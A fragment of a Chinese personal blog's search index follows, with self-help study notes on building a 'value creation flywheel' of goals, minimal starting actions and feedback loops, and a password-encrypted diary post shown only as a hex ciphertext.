<li>如何避免这种情况（就是你打算做一些上面所述的事但是因为可能的因素而去刷视频）呢？就是用智慧去欺骗大脑，即最小化启动器：把你的宏伟目标分解成在当下几乎不需要任何意志力，小到不可能失败、小到让你觉得可笑的、极其甚微的具体动作。它的核心不是为了任务量，而是为了完成一件事——”欺骗我们的大脑“，让它稀里糊涂的开始同意我们的行动，让飞轮从0–&gt;0.1的转变开始启动。</li>
</ul>
</li>
<li>锻造部件三：打造反馈循环系统<ul>
<li>这里也是一个失败点，如三分钟热度后飞轮就会再次归于沉寂。原因：他们的行动是一个封闭的独白模式，他们只是在默默的做，然后用自己主观的、市场带有偏见的标准去”评判“自己，这个过程极易因为缺乏正反馈而陷入枯燥或者因为自我怀疑而陷入停滞</li>
<li>而认知驱动的高手懂得将这种独白升级为高效的“对话模式”，他们行动的核心不是为了感动自己而是为了与世界对话——反馈循环系统，这个循环器有极其简单的四部构成<ul>
<li>第一步行动，产出一个最小化作品，这一步是我们上一部分”启动器“的自然延伸，这里的行动目标不是为了完成任务，而是产出一个<strong>可以被检验的最小化作品</strong>（就是必须能留下一个的有形的产物，如exp、poc)</li>
<li>第二部反馈，勇敢的展示你的不完美，这是整个系统中最反人性，但也是价值最大的一步，如将最小化产品公之于众（潜在用户或目标读者等）反馈的数据信息等</li>
<li>第三步修正，进行一次认知升级，收集到反馈的结果后认真分析客观数据来提升认知</li>
<li>第四步再行动，基于认知升级后再次产出那个”最小化产品“</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>为什么这个反馈循环系统重要？因为他能解决我们持续的动力，且激活了大脑深处的奖赏机制（这个机制有非常强大的驱动力，即多巴胺）</p>
<h3 id="组装三个部件"><a href="#组装三个部件" class="headerlink" title="组装三个部件"></a><strong>组装三个部件</strong></h3><p>从”作品“到“人生”，你的世界，你来创造</p>
<p>价值创造飞轮的全部部件——北极星、启动器和循环器都组装完毕。</p>
<p>书中分析：它运转起来后将会带来仨个层次递进的、任何人都无法夺走的”核心人生资产“</p>
<ul>
<li>第一层资产，也是最表层的是一个无法伪造的个人作品集。</li>
<li>第二层资产，是内化于心的一套价值创造算法（方法论（反馈循环系统）–&gt;思维本能）。</li>
<li>第三层资产，也是最深刻的，是一种内心笃定的”人生掌控感“。人生的失控感来源于对未来的不确定和对自身的无能为力，其实就是源于你对自己”有能力持续创造价值“这个事实的情形认知，这也就是一个人所能拥有的、最稳固的自信</li>
</ul>
<h3 id="当三层资产都已具备就可能获得”可控的人生“——选择权。"><a href="#当三层资产都已具备就可能获得”可控的人生“——选择权。" class="headerlink" title="当三层资产都已具备就可能获得”可控的人生“——选择权。"></a>当三层资产都已具备就可能获得”可控的人生“——选择权。</h3>]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>每日心得</title>
    <url>/2025/06/28/%E6%AF%8F%E6%97%A5%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="179a3fc5a64163af5f4c2588426eae70ffee082eb77737b2697e19b7ee6f5d0d">aa660c56d9a2d8389cfc1a02879f4fc7edd870ab9b16360cd85299dff2c2834a1efc4292aa245c5ba11ef526e02e81f0db9879062d9391c302e28653473b388a6dd0f473d9ac3e2106eacd0a144df2f035d99faf9329fb3e32a45af26f51da20b7453d195c1b15990ac9f70940ccd33b2e6bd7afe0a82c4b4ce8e075fa6af13eff833005449e5388273233e509e47396e78931db990878e8080d0c26a5d5ea74aaf5feb572567c321f76aa0c95e91aa698c1f6654ffbd0ea5cb58fd4de753d065f4cb427b8af6facd9ccc5b172d3c3b39adc141dee1048e818ede2c94921e29aedad8f4f1c6a1528a9f5fc25783690fd21ab3ec2ddfed9b199f126cf9f7ad4c2033ebd455ce9c3705170161a8c863d515b399ed496c4935a8566d0474773f2e5a920a7e38dbe490d425fc5010de22c97d94c586943a6708b974f5b42f249f443dbd772039edc2434fe4185b188f0380c212f0fcb9e0a581e3c7be198a6d9e57ada50fa60477da5f6b955ed619713e8d1af8fb5cc6cf0c773a8e91035afe0268bd12e4d38c299c467dfe1ba6b90926d458609c1d0d992a92f0e8a7f13018a4c231956d09f74ab718697fedc7e6f147e30e9aab269529e02ecaee386b5b037c0cc22eb5193d39db04b007d4ccce105ec17660c2eb2d42a775ef853583a65c4c77a713c36ef435cd95a2543f08e8146c3ec9842aee226fd7e6e2fa13eb1b1cc498f411ad83eab3f6ef8a48f1238464b1c6aa548dc7fbcf4d7c24c527a0f0d97da63a2c363e443a4b0a86a7984dadc7021d9bccf82f29f1bee5365bf9193a6c29c32783fa735f89617ce16568226547486f54be0723fa961d6add6563833e9fd607f534b598b13d93ac9b9941e2117da46702ce7853dd9314c1e7cd0810c40a11a23e85df6ae5da75ab7292c51fc3bb78dfdff30744d105976e72a9751747b782a3e2828425d1576d51a9f6b453a757bd9d8055857fbe814d526e3deb5521431e717de213c90f3eef48393112232ace34b48c0ddd1d0c6fe6afdfef5baf4b2dde09be755cc49ce17f305523cfaa0ca17ee0e59b12433564bcc2ebe0d9911b53a557cf70f49a553c8f895934495f9d368698f47e3882205d617884c3db62fd341ff9a1e90c925d0dba1e8d610909b0a94da8025156a93caf97d460d9b82f15937fdc94ecdeac24e4f186bf90301a4e89538d66b3863344ba3b20620a28302ba8ec9118e9d5b0f804c394f911836195467cd6fa23dad45c5e3ea5e41cc680990120047a25f90ea910045b0a95051f7f42c0ef26e8b5c67ce63a48134f7cda1df01a39238998f08a043cf525dd76a9fe801aeafc219d2ac091bc40613131d061f07ef47973ed4dc18d7ebb042ae39e206f4a8a75c40d8d08de294fc5923e31b492b008f8800f4d518efc5061b5b9b49b267569935899bb628f51291878895fed68346bdb5ef0b13e7cbe6be67883a8c168529725b095a5cc74a50b6f71fa87050b519dbc03ac64e1a608c03feb85ccb45acea2f1afeb2d035112dac6925716d0545d282628779a3d3f272d40ae31ea83d80928e9fa8c5f93c373475c0d5ef5dc6ad6fa3feb49ad5de6d3c7a9ef2c66349e39c66764231129ec60ee7e8befa19fc9370768b9388a258738f68b5dc03980ea157b6443d26879f5c8d3978a2bc733c609a64849779b4c4a66fe1e285ac66c5ef90bc76d6095f2e485bce5b05ffec87ffa2bd240d43128990b07cd91b6bc2ddbb72983075d1b9132e2b1f56c96e07e5578694018afea2e3ea381a6e7ff8955cfe5de1fbd007a5f5d6bb2001b263a0c2cb8c55e39f8538e7fb4785db088849c32967410c2342699ccebdee2ac2fd21ca0cc2153c114fcfb199182a1722a9399aa3823d59c516628cdb9a5ecd8a965dfc84b9ee98a484efdf597a2265463fad99206f20e470be6d8f8a23c561e81041f275e22be31c025bce63390f74c519d617dab32a3f6b051fc45a11653b233139fea3055ab3c0ecb52e9abcc19d48cf6a0a5c7b6c642ebe282857eb98c49aab1462576e500c7e2963db46124c6a074278fcdfd0833e72b7ccbee45bc0e2047fd2b0f89d415c0855dc96216864cbe7999802d90aa1a93a4691d4bb6ee99d821924d732d137b81542b7edfe693e757adc5a042591aeaf58063fa0f484f3bf3d1b1f3bc7072ede030a9130d3152bec382f861a2fa833e564c66897551c2ee47c9c973841b985cdcb42516f6abce6b12d7e245b30c84929249147c9cbd2f0025d8dba6cd9d96bb3b738bf4b97f80b07df4e11c85546c6bd1e18ff91d0a42e9a1b824b1548db0126d87eb101a9383b04aeb41a78a1393537a1dad06059efa401bd3e3e4f7c9c7d30df6befdfca08319d092e9e969cb253c71d939205d4ef5869d793642fee7fc51141ed9e04adec24bf01c2db0b02dca0a3b40f9c93819526e402017b8cbcac5aa0b1f6cf23b15968ca49ad48e10a35f34e02baf711f4f0d9bfc4d95125bfe6254fd9d901fef012ef245d799a437323e54fa7bae0d55e39b0efc067706d15119477fad5d6f5a358fbb9769224b43916a4c1cb7d0f1ec5bbf30db7161ad36e94fea687686c11b6386692c93f37c9358332f97002f30df769ea9238c2a76b7bf495669a34d8aaea9361642a57b6542607b078dd190db6490e9cad30b1a8a4ab84465c85514cf1fe197a4fe07195f36d2e65f1a927793fec15bb785a6327830ab93688fa871373a45735e22b02ecc98c58dd33763a15b5f945fcaa4dbe1cb814c212e5f2621f03c53838cd1547eceb168eb4ee61b8442b403e893a398c8b14824622573c181d235176135e1dfcbdc14bda9cf33e8275f0f91a236ff8dd034aabd12e834526451dd2ae92190e9aa202ab12d78a0fdc97b3f20fedc1df99e181731c4b265944af4afbeeba90ea158a328eebcdaf95047cd882e0320f632949670da15a9096ce6eeacd234096a7740226059c3db1815b2d310fec810b63da093e982c43e39ca762863b2b1d9f59ec2ae9b73b0a06a6d47bc3231793e203ff25ee6615c2c50de7aba924ed234a505f04c17383764761076adf37865a7a62a3f169cacb41754f2e3c6529d3d36bde17a5fbccf7cd0db30413c8b0989301be2b63a65cce6f95bcb936b03762fc4388e1840d4faae937a9a002dac7211a83c69fb807f63a321fe6e42bcade2950f4b816bf088bc67716b16d420a1c3c1b3834c146122275d65fd74cd7df78b0ea769b33cadedb700ccde632850527dc0649d16ca428d0f086ed571085b9ba7ad24346bbe31fda8edb4401c1f13b736c98cab6f2c7d260f0611b8b8737b0ebd83e3ca571d0c2067f69aa64dbb65e89121032943c4f13c61b5ac1094a5438867d1e67e8e5638a8a7cf831a4127185c6d24222885189ec2d73edebe9b9cefc2ad03182c56a0f612fdf690719cad0a28004178b158f0c65b5d84d85ae1191dfeb29084fec81cc3e4370c4c689700ac1dffbd7a82775c2d89989f0a9620a2f11088be88130c5f1eca94006baa24df9e5247f687cd6b19f31e5c25aa7aa652018923d5ca0c64488149686b4a5046ade9b43823c8f44418033221d5a6b21f8d91286de2ec40db5e63a96c496a3906d9f3fbe69f1f16c3732d33c0c1d5df5c12be61112c8150c662bb0669187cfbb7fbe1143c706301706e699eb2c24e4531bcc33005ad2eba7dd2c5d354994fcf3e34bc527d86873e2c8232d1850b5b1f3572c6d1b36162f264b3a626603f6953244634ccf9520cd2f16b100fc755dc3eb7f2c9840d5e8c537f07c47714a3d7fc0b81508d8499cabfce72a9bc879b6bfba255867a3ec1ad79700e9cf6c664f02b77d27e487492c9b5e0325ba4eb8de30efffa1eb4b1a26c65dd2d98ac331008e5a0601569a4ff2d2bd5023648ce82763130980221d8c688679c3648851076a545f971f975223545aa4379997f2af011edbe28b9e0376d36aeebd537887d1a72ae96ecc97cc3730bfeb10aa6dd409740e2c2cea427b5e42deac3bda1819aa9931e8da026d2f4d09d42400ad51e94e4cae90d64ecd3dad8d56ac0a6edd2daf86a8486f07dc6fff2e7455e5a41cf079db324abfc5b5a3991264c68ca8646f1ac537f12c50bfba15a0ddb0bbacf1dad7f8cfdcf64e1c4152207c37561834d4d027afeded4e6ea01d96fdabd29727c9ac1579ff97b5748bf46a22fb636eff8d387e90c0504364c2dea3e4c65e18680939cf3f0b80f0ef4caf8da7277f35a3142107b2cd930ae5c920d32768a5d95fbe13b264707c47704d654f56acdb66c1566bce664fd981af1eaa9649b26109fbcbae1fe2a9c3ab731960dcf0082e24b5ad8a034d2c35063b0a288808c51be7b8670b0b82c655b5921e79b00e41eab4f4d18663c13bb3e967bb915c59281264368c869620d7bc599a8f5806ae9a7d5e70bafaa7ee55cfed7bb3b7d34d24ca068163ef098db225f10fe7ebc24ccf2a0f66b8401fa3f2e539398dd3b546ce78676923eb9d8898b295763b30fde92a2150acf1cebcf2b96613c5254ac01473414c9ba0faa40a59681a64355e1f24832b1a0a23d83f6b374b5980854be30b44c022e5a7ffff9b5bb06a84f0fb84632beca72d8bae93fba1d670eef38f19d735ae0a82d67e80f9463a52e44f23fe1a1c3d56307377ac7acabf4a5f2352f4613bbaa8ff32ef0421843895f074405def0a4cedd7743cb51917527064e78677f1bb23fe8f484af01efe4a4424663969541f97d1c0f27840d84a8c16404317359e5c47ac8122eae135e531cb0eb3ce714d77f6003654781926354d61c929e78ac2a07e28cec505805c0a94595125012de5acd4144336b02df5be832702353297b2f930395e23c175a23b7bfece74d6db3f4a7991880692f5e3354fbde2a580c75958120eedbd4425b4b2b3a00406af4b0248694ed57fb0a4df78b9b9524cb89f723044bf798c6af66f4a95f6da1cc406cdf511297b68033ea8116dc5998fe547f677f0cba91d49177284e095425c0af96ccded39260419ddd8334fee1a9eec4ead0d5bd0cb14017ea0b98d8bfff1d2a0b7d5c7d7a6560fb97e0a9caffc3ac6b7f5dfdc8cd4104bba452c6be4112c53226421ba09d881a5d8a4e11b508b6ed11be3d8bf74520a404fecb81067901f21441b0f638ec2ac8b5207d764dce83030d41a89d8315c5fa6dfb8fd9f8ae061b0e4825705deaf7109896b161eb0d9b8d65f0d877bb66cb9c0ed8d382720dbb1b286cbf762f558c059bd26816c7d3f7c94de83383a95941d2a1d74baafe4a57f5e82ca374ec4eb7fccc0d5cd52e9303b8acabb950cf1621b436801c58e34b9b372dda5d48c5b95b8dff1f5038550b9654e2e123fbcbfba99226d2dac3fdcb27406dc5c444a771f284b0834be04da7aa3170e10793b426f10b7033457cf1e195aff0bf77f05ae539df1282ec8a50d3f6c5ece73917f859b95d9642998e9b1baf8511dad6df4e3b7ca32d8a05dc6b0e5d1e9d6eb9ce5684c1a86030acb3f11fcb5dc94285dfd74097207225f87f41f669a220a4c62cc2b3bfdd5e085e0aca0ba038897b3a4657f6ed9651588db8aa8f741a0182c5ac6ec217da900a5911a9a8712b793725290aa0dcb3205ac027bb4719e1b651bdc4fa7f5e8139f24631c0e9670a6aeeceab407135fa319ab53cce4f89234f41a9e5c19e456b309e4d59fd8e768ea6d393b79c4419fc453b04389129d5fe1482b7a22eab0c8ca0a5e701e8cb46142b1ef905371db0a846d9c5100f4f4269d6395b59c4bc88eb3896b5e025fa8c3ee79a8fb206163012da53ec05a352366d33d92758850d0f6188d8360b0f10ccb69c32a4383daf132a0527311dc553f8f982f4cdd0412e03665791079af744a0b485e927b6e9488fac6e3d7713e7d9dd2799134528fd1db6b3c2e1587fdf66d5eff5d7c2b506995ea11e4366ee917fd192d13d0e8ab527710636c44e2c5734b0d25e370061ddd1b7b84d657b9ec1f27d9760f0fe8c1361b2c660cfe5c5acb1c7f2b86d4c1b0d86a065b81c34a448591856ff7d77ffd5130b8228415f3380721fa8eeecb6e4c973f33787688937ff96127374db4c0872ed077e1bc2dd83d39488ff7d69ef1042eacdd8f9d06c2a37a6a66e8d3fadc511c4eba85010cec8294181f4409959d9225c18a99d6a58250521f7cc1e1246372c837903001f1f6eafd95aca166bdb359b936b5df8d05fe2aa3a8d03def8e75a6a97c1a98ec7837e47944f990d14ca808c238c2f4f8a3f9b9234943d49d6f6743ece33cce2726cb0837cc42bad5214c960a7037e8ba846a3cb3f66f99224ad43263c4f45e6427b8b4d7a505c5748e8108761961c3e1a9ab0bfd5889c20502ee1b9ec5327418f5ffb4bdfbd1bbdb61615f94d8956c6880c6545b58f43e74d45c998a4ada4d9868b656658d315fc0d6b40ebc77e3ad8548e2fb31524f0210b6b7bd62171cf21d30e6289c3ad2e8daaadca9345870ff9ffd995df67aeab05431fbdf7c84b0b0140e57d32e8391167d13b7551cf08d7049fc926202bb9498160f44b5f3cfebd8d722276fb01bb558099290ed299dda33871904b7659db503ce92cd1780986ec1e6958c6719134c681362b2002455ea2e899d78544c720897a25c6a9727813c0514218c699f3b9231dc2192545960870b4f8ff323f1373ff6734302de79f9af5ee9232cc5dd64ec99aa623649c79e0745c955dc99f2690cb9bf9918b31348a23362617506e5c8cedda62b7baae18649de60adf4c434d246cfd086290118d0c7b37240501add99372f4278ce770c6433a051dfe533f41a1c122613d71d026868d3c339055c6a10ccaeb2bc22a9f9ee52ca560a5508538447f1ca473033ba821c7d2421a292573c97c7d4946f0c6d24bdaa088bbd298d28d7f51619d4bbccdd7d3abd44447b557f9113eb232f3ff50355e03ae1102981c3e348ecd16d54e05fe95674437033ed6a07d0cbbe5f84d7bc3e514ab9135dc864e4a7e460b81c5c60d2811435e37795c182964a0b02197a10c7d59eaef20276f86ca22326dec92cb7a10b659823aeceb8b1e1810ab28f1811c4509a0fe2a74a40073df5754ff6fd53782d5685a81eaab826e7b114ddfb0153f01aca8af9217dd0110aec48437bba4ac437b964c3f8a8bad7482d51842a531dc1624e46420e3cf98e4e577f2b3e571f3dfe8fa47ac440325319fcd4e654c0c9f36b1ead79fea28cf05a6657259442b956075fbcf32fd1d2a9f51d1bb64ff2070787c00721e6eb24d2335f18a1587f6655e8df7d2611cfa4e2fe542b3595cd73ab69057d1e814d5a46aacc8bac0ec4f3fb7bb9e40be7e1641f2dfc82f8071115c374b74b8a4b551312271eb9083ab94290b9f56255662538f9015a36944c74ecb03038e7547c952aada427e334bae1e320ab6869327395a2daa12b45cc5a2aaf2596ac10c043685833a212e53d1169a73eb08cd1028848dbf25b27c606227fbd41f0ade817a6ff97533abafaceb867139e6e8a5c1d5a08b7e64379010ca8617e7d7e5e26b25444950d0e59ca06ed4363f78c0c70aa18e9bfbd1b27e199abd6d05701d443462f1436199cc9280264184bed45e1f138d2165d7539c2ef13ab50569094fd8ebbf6178187a694748108299e1272f5aefb789c73be326f52bd9f79b8a53b6934fdf1fa09c991965633f994073033a3391fb5d050101600b049ac00b56c508357d21c3ee1bfcec56817d41dec699050c9c871edaa5991a8ba32343e238f69381f6ae482ee1ce49380ec6f16260c14273e6280d3047724a641a4f21b53508085aa7c6e02dae7a9b648c6bd76333f02998d34eef0a891ba2ee69f29c88b820f923c032e0db02d6ddda84058647f6b054f7fdd450b803a8849a4003526c8ba275f927b4455d67a5ede503a64bca359857c09dfc1c76b0420d8372494176ed91b7eb1d1c74af8c7e748b6b324d3629534a93b645228b24019503c4b2ccf81ad2d3792e9c43650afabd47eb379d23703d7ad37ee55b8312a1e648f1dd58d9ab69b79175300674f7a70315d92b66be2276474b6d8f98c205faf4bf1a61dc08509f93fc289154105a0298f8f169ff32e53b4858c6f0c4f912f9973f50d4f37fb5199da8bfe145371c049f1bfe7cc84389a88b08608f6e65693ad0bfc63063f534eef65066a10b801818a05d0b5c0c832be04ae68a9a826fe513c5335d3d8e00aa1469bed0fdc9380d9f8f848c2e052642eea4111d48ab9a4cf3d400a0a2f54269f55de39975c9a39badefbc8dae633514213014695e2635c7dff990fff446ba8ccff46195f1d74e5a599e71df10d4e09a914e6464ed14cced76f7b6b6b3d8b72b79ee8892a275ac186c3832a070715946d54cf8bbf0316ab1f31de6f96b5208548ae579edac354677da1b0e350930a60d432addd444bf1aacc03a64b47c6cb5ea23b83cf45f0c5577e3a47863771aea3d656fe6defa2c1fca23a006fc7f2ce9608987c2f9e7731d28be24a78bb29c9fedadd8aa95bd262ee92105d6e5c282a5d4aed97037b05232ac3265909ba65e4088688a9935782518dd0f6c45611f600d5495e7776322efc4a09a82e1677dc8a62b5eafdf747bf60620f1982827ccaa7d4f80286542c78e8f0ba9568c706892fbd02dee3875adc41fa6ab285647fe81049ad45716ebb62dbcd00f2caacb2b1213f21d64b8f9ff9e5c19b0ed747895a123b9ea0055be80e47f8e7935df1daab64867eeae5e6bb7d884ba0b14031533447e0735049b49455cf69b66d16cbc58b4224891a54539ab02f857d2403462e9ef4a1b7bf8b141e0d98912618121ee6f41560673e23ea2beb6343ef0745be231717688e527b775cc3de1807dcf513200a45f9b9282e7f938f225d23766d0ab086e301a76da7ef4c717d09291c0b533a890667b05cb5ffea26538a93e497bc8f0d10d85d07e8879b723b67118e097b218b079796ee044457cc9b1add779062e3086821fb7b50fabcb319560818a5647501a64363ed99352e97ce7be6437b58880e8eadba74b3fd42c0ca9439d08b05738de6ea367380b1d52fa2732f62f833c17691a159266b79189d12ad4bf0cd99723e04551e93e142095c3d4442ceca147fe21ee822fc3216107d57f553f55bc2db08e8474b24871f8bc8f121fc31497b22e622c29763dfe9060135809334fdbe5516370e11e74b1bccb5743be1fc3f1b460da1ad433c246aabd05f70b6a353510ef03570b7fac75eb7d1901bd477a3f65ac5687366fb68f4e125d76b323e6c2fd93823f2e887acb0df53b8b3892df2766849f60e15a85123fce16d951716cee4d1d9aa7d1547900b6df274e63861cde9e0628702f1d33b9f90e5b64d5f7ee29d86d9ebdcbdc7261465816aec24775e14540199632e3c34f6145b393cd3e35e1d963b50a638316c9b7869bfbf6974158e0167e832e8a3470da9bf9f63a271cecc2479833907a62187a9efceafb8854fec32052037cd512c1fb871b0216ebe1fa136de7c3114b40ee678671d65830fd7a2169b729bac649cc97e64d302e40fe7076da98900f7b7ca1bf587ca2227c106a02c8d9289dfec26ecea24123a6d6f44b0625e1ec2ec64c62975afd024d9085218c540000d70313a0749ce33fdf56965111ff10ec2692686bf728f3fb631f40c0559e194cb7cc638131308dbd6f907ea5262227880c5410c834e72408276a6919b983c5017200ad5bc1dfc624d278a5085f2088039b6022681d752ebe39d07bad708c20ef95df5c36a532ea8f5e77cbcfe53adb53ed4cbbafef54e794bdcc453faa8ea3fa6cad6e1b58d2a7570b8dc59df5c860919859d19cfa4b174097d1c52e9dd924dae1a30898004a6820cfbdc651dd39303c5bec992524c35f034d13052e4968439f15bb3863ee6b07af099e4f194fe040b9b5ecaf143e32be83f8b54cd775a9c34e2036bbbe92aa8001bbff930f06e854ca929d11a0246ab69c06f77da6c3c06742bda72911561ec302678871d9f31191f144cfa1576164fed6ca9df1a4c512428b9e79575af271f36b0f7a4bfe06422a98d37ab5de05a7b5eb1b342737f5eec1d49cc48e1bb5b40310eefbc63da9fa2491c919d4d3ac28cffa847577271ce2fcd4f24c2be38e4dbadf72565dba26db2a42b2ee3fbd75f8c30eef2450ca4d48a82d29ae10a7eceef763fc4efe9f1a9b4491389e42b92f8cd7943aed9c236e99c45362841821b172bb3fe7ca0a644578191ec3d7524a7429d1518299684e7b77cecb07c5d65457bc5d9c3639897f8ac6d36c612c19320f605e446b6030c2cccd796bb7d0f5473fbc70da5794dcd5f724b2e0086ec8232524444166a78885310e46ff23059fae57c966ccbbed564a37e9f62754d07b40223e6bad375b2f00926fa7b880fead07f6d17cbac6ba20dd2b9ff6fd5c141f27431667712362fcd67b98355760e03c5dfe90d4417e0fdaaadd1beea74172dbd35b07e56b903c95b8836d6d84b5a06c74b4df4c869dc3d628b220e06dcf799f4dd0d62caed0e7227890ae32c54f390c91782bc60787e6911a5efa7b7f4b2216fb62394b1485cf95eb49733ce89d817244b46d8d7302a907a1285c3cd73a04bbbd264271c3548890d230a44721b905fa70beca95410505515afc8d0c03e508c906205ba9afd8a0e764c818c4e2fcee034ee1088d752b378b259e038eb44c88af279849918e033bc03c013588c6bbde690b2cc0233bd8213c6c55053e20e39880ca583bd128e39fe244371fdd06c97637dc1f92ca94b9ec049daf8cbb8f7c877abdbe3a315f6fe357e01441ca8b6e34526fa384b68f825ad8d57ac513e0f349f8c3a59f37b70e9701179d963e4e20d72b7d1e3ddc56d3d683179e70ba4c2c89be3750fdac579df96d5bd7d100156a14036f1ab893d6a2bf54eca7f900b19826b1288e3e39cfebf84e7581a36922a0fc91169e9db9f472e0e196e7d673e6d7131d495a31fbf9ce8f90501b4b24fd6c7b2e05c6ef8854e522291f59694066b93741e1e45d5cc438506621a348ceb5192259f814b2b342c2af14a6cc85914a85a301e995862c81ecd628e53ad8abd5eddd8b3845b19b26cd4f2e74640e2153874ad84d40b0457b4c61bd6d9ab53654b5118a55aa50742310851c416c14a1811d41e69cf231f98a682099dfdb55ed0aaeae2c5c6044ecf40830c5537d2f5780886d313f8592c468d0705c0cd2dafe414a387c4473c4bc32712318974bec6c8d926d78293939642463bb580c5be40562f899ba5ccb46a2b02194022aa4e7215de6e160e7ac3943a6751bf0b7846ba674e445a3742c2e2567983f2b3e4eda8450716daaaa7b99f5d66db4301545301b97add899ffe934ad8b20fdffa2264981e7a215c6c3a3298c3cb71e918e3eeb9f135d7f1af8e1e28311366368c5a5f10e526cd1bf07cdadb37e0deb2bcaa74d39083ac7fb31c7d75fa285d1a2a3fdf738c4ccf81f29928055cd4d2075d2f1a12455a5aaaa862ab13f830eb80d130dadd80e27aaff3b3ae1b0b986017ee09379fd1c38b159c11e34868cfc4fa68f60a5752e60b1e186289e8f50d24cf07683cf13d20b522ac102cf0f8fa76df51e6000d4c6fb73e7d11ef84b0ce4572cb19940bbe4e80d6cef712b5abfb51689966de8b75fe829e01c819a38767e72d3b5698b6c8d8dfd774cb4a13818751026c0b8101b0daea82b49594c979fba602aa47470c97cfb01f0c39e11bd3adfdaac0f08170b335aed1446640081efc8184f8cc0f082551e427228e895e85f48eeb610fc2431f568f404add4ff2c7fe88481550f39b3877d0e7eca3757cf447918a59cbfd54947514e4da29de176685af2c15f23a1aa9e6571301b8ac34c36ed65054668377652f9339ca8d53170dc007ed3372e83890ee17493a1e38d3640c3a818ef26133d0ed8f801c644d08071e22c51d3d3a8a6209435f599204a18a69febe3003473749636a1032905fb44edd644e35de07c19ac6a148860d1dd5a9144a2ec9b2e89ff2cad50621ccb4b368ce53148cc56a4cf26f8d7f9b8a1105325fcbb897d35c00c4fc18b671cf128cb290c915f6ba19b9b2ba564cfd390c8ee2166f558184fd3a5e03f02cc0cb378e1785b0082fd63c12a5805d61c576212a03f8e14c67fea42c470f9da7f25637a9f6433420cfcaf1a8103f255c6408421eda527b368f2a1f88a36d344d0aa012c9e3c916b3b5daa9d81faadfb17ce9c7a6d56106308fb77af9ec7f869b956d4b7ad4fc7c99be8251c7099f31d28b629e92aecd8a3a952a64e756e7fbeba80ecf18e1c1475c3a81c1cada2a822d8fb2469663bc1a16982faaa2c13f676a2b964c5744f0e4fe343249989a24806b08e9749c92c8b257a69c4e943ac4ac66f3c4591b6a7c8c027d114cc1d1422425489f3adb91996ed335b93475be3ff2fdcf77d123e7fe4e74e1aad15ba1988f5ba0a19cd9bebf1d2d6bfc61c3b5059033a28fdf82b109c523988227ba05f1a2247f728a070c337b207992eba0e9b2c864135ae32c1fac6cb926b58ccff10ca1b47df9ec226deb400148808401ce575355635cf5e92289d2827076fe85e6b396f57a4ae10eda9966dc441701388a58c4b00248758bc31eb56e60d32192b7fdf7ab04e67b0e6f8ea4dd53f67f053ddcb1f910123a2fe7f0dfd42e9621933f1e11f77406456c4896b2d25fb8467d170bbc72ce4fb24445c8efa9cce3410c9275cb8a97b5e5c6fb3f8a4a0bbcf90eae34e42dff58645e1b8f678b0f60ad9541b7e1c69d9a4c59db8dd5da47d9cd17829a5d2af6b372489be077e77a005e53c4741b500c4f11b4aff995f3888c7cb2cfbc6ff77d06f29aa8fd9b1f8393687fb42580f0a3f4cb107325091ac066a360b8c377eba5c0ea6f20698be343adfb1f69bab55db9efc264b7e1bf9a1bdf20ee2ee9e2b688194dcaf44f9cd52038f7fc577847e929c57f7213f3f944ba4ccff5707f1e96424281d9b67b725e73d29686c63297a8bf10fee2dc92291948c1da2074c13405c4f3f3509c8f13f9434f5bc558075323a7974153e613af611d79f72a57360a5b21e3d4114ba751b73ec43d0b8cd5b50e19d2fafdce3c2c0a9b9773e49bab6af63c19976a2856698c1859557a8d27f81787b4fac51688c06dbafc6555c872d29d49c727d16a46350a36dd066ba50e24dba85e4e83350fdc5089a81ef4c3a306042f35d6a6788e2c920d7f1008926bcc539f5cab2aef2329631105b65f975cb1aa6799ff2720aad180b6dd318431479b7d3eae7e685ff6a570d071a88c7b0fe2e2e6f9f34e0698f0109b417d5086976b058d13725ffd09e49394beeb77138973c71067ff756388ef2971c41541881ea45fe827211717f2d097e0ea2c8f3ed9f21280105ca9a9376f8d99ab25aa4480c60128a126216206d18abf6cef19d356203913f4816cf234ad87949df6a3868594163fdf67959975f18ecec14f6198f8c4f177bd83e2de3959dd39bb111bf2c54af1ee286830db39f7ed0c2ae902e1f6b20f850fde0f5ef1384b42b8c40cef1bcbe6a91834252767aeda62e2d40ce99a74a2df89560ed1e3bbd89077b09a2ce89b5609d34cbbca85b1083d5a8381f9c69e691e70f257916e965da14b1c7daabc70ee5da049547395f7e61c765a1ef7b22d94399039e1b4fab38aa2513a7491dabdf01ccf2202b00e168b7c5f0edddeb89584dd7b9cb46450b3d869844313abd82f2b4aa9b7dfe953287c9baf4e5e1fccc1e68f9a939d6f6bdb20cc2743a49e27ea36a6a9c42c3f5e0be5bb1ab4018d907404658ed7cfd3c8ca674dec7f87031a487e78d87e6771dfef831bada091907fc8b72fcb467fde5c2a8e05b46c2fac63321d9f63c7cc364bb5eacd9d8138429c65586d27f0fbf323496956e926b44953df123c90d30a79c7647bf37e91ff25ce0758e7f13c2f4998ecccd6a548ef81aea2a2f5225db24f561dae50f1b4ca00de8cc1a4013a9407c8352809d61f8b08a92b0c4b791f26b0609f9f3ad3ff3e68c393c97e588e28ca9242a8eda793712899bfcc76876889456642350aa62741392992e1b4c7995ab470d5a770b0e8c61339e7aa2233bc608c60b4b1b527fe24155289e649ae5e59e5f1f8d67fa5b78e41bbad2ac6612eb24eddd8d2188c10f9f026a260835fac86925fb3039da311e642871291a5887b86c029f1c97acdfc17f29227883bd09f824418dad7dff47b057ee49fe119dd9c8ef13206dcd8cb23e1385a5ee764984dd207e595c0afc4270e118b559359b75087e1be66a7cb85967388e846295d160f853893be3a2479576d568c410eff6dd4495ace5986211bbda2fdc19ab15f3b80e594b035dd87bf9a6f34b9b8bae293161cab0606ddac2d4312184704250326b0be9b9c3a27549ccbe2f8212591520edb34db9398f9b4b56f07805ff16bab0f83578a0d0dbff85cef612ab68c675f059723e5a219b166da35c91ef6f6f655071cf2b6ee20790ad8ad204f2a70f1cd8ef59746841e044672ee990b7c743d9ca788a783d08515be1379b6608214972b015cee89c86e1b725c9ab93df99d56c80864f62fd2e51528bc45f7c893e259a6108645761e0903595ed1ca961c306da3210b27a49a30f70a7181359978908f468df252b3b026ffb7bfe211ee97b00329d9eea20f1feb0816c0de78756c94c1bb4590a9a05bf97773c3540f33efbbb